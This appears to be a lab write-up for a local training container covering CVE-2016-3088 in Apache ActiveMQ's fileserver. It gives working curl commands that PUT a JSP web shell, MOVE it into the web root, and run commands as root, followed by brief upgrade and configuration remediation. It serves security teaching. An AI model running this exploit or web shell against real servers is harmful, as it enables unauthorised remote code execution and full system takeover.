# Apache ActiveMQ Web Console Fileserver Arbitrary File Upload RCE (CVE-2016-3088)

## Overview

Apache ActiveMQ is a popular open-source message broker implementing JMS (Java Message Service) widely deployed in enterprise asynchronous messaging pipelines.

Vulnerability CVE-2016-3088 affects ActiveMQ versions prior to 5.14.0. The ActiveMQ web console includes a built-in REST API called `fileserver` (`/fileserver/`) intended to handle file transfers. The fileserver service allowed clients to upload files via HTTP `PUT` requests and move them via HTTP `MOVE` requests without authentication or path restrictions. An attacker can upload a malicious JSP file to a temporary location using `PUT` and subsequently issue an HTTP `MOVE` request to relocate the file into the active Web Console web root (`/admin/` or `api/`), leading to arbitrary remote code execution under the privileges of the ActiveMQ process.

- **Web Console**: `http://localhost:8126/admin/` (Default credentials: `admin` / `admin`)
- **Fileserver Endpoint**: `http://localhost:8126/fileserver/`
- **OpenWire Port**: `61616`
- **Docker Shortcut**: `./lab start activemq-upload`
- **Container Name**: `cyberlab_04_activemq_upload_rce`
- **RAM Footprint**: ~300 MB

---

## Exploitation Walkthrough

### 1. Uploading JSP Payload via HTTP PUT

Upload a JSP web shell to the writable `/fileserver/` endpoint:

```bash
curl -i -X PUT 'http://localhost:8126/fileserver/pwn.txt' \
  -d '<%@ page import="java.io.*" %>
<%
String cmd = request.getParameter("cmd");
if (cmd != null) {
    Process p = Runtime.getRuntime().exec(cmd);
    InputStream is = p.getInputStream();
    int a = -1;
    while ((a = is.read()) != -1) {
        out.print((char) a);
    }
}
%>'
```

The server returns `HTTP/1.1 204 No Content`, confirming the file is saved.

### 2. Moving Payload to Web Root via HTTP MOVE

Relocate the uploaded file into the active web application directory:

```bash
curl -i -X MOVE 'http://localhost:8126/fileserver/pwn.txt' \
  -H 'Destination: file:///opt/activemq/webapps/api/pwn.jsp'
```

### 3. Executing Commands via Web Shell

Access the relocated JSP file:

```bash
curl 'http://localhost:8126/api/pwn.jsp?cmd=id'
```

Output:

```text
uid=0(root) gid=0(root) groups=0(root)
```

---

## Defensive Remediation & Hardening

1. **Upgrade ActiveMQ**:
   Upgrade to Apache ActiveMQ 5.14.0 or newer. In version 5.14.0, the `fileserver` web application was completely removed.
2. **Disable Fileserver in Configuration**:
   In older versions, comment out the `fileserver` servlet mapping from `conf/jetty.xml`.

---

## Video Walkthroughs & Technical References

- [5 - File Upload - Damn Vulnerable Web Application](https://www.youtube.com/watch?v=K7XBQWAZdZ4)
- [Apache ActiveMQ CVE-2016-3088 Advisory](https://activemq.apache.org/security-advisories.data/CVE-2016-3088-announcement.txt)
- [Vulhub ActiveMQ CVE-2016-3088 Advisory](https://vulhub.org/#/environments/activemq/CVE-2016-3088/)
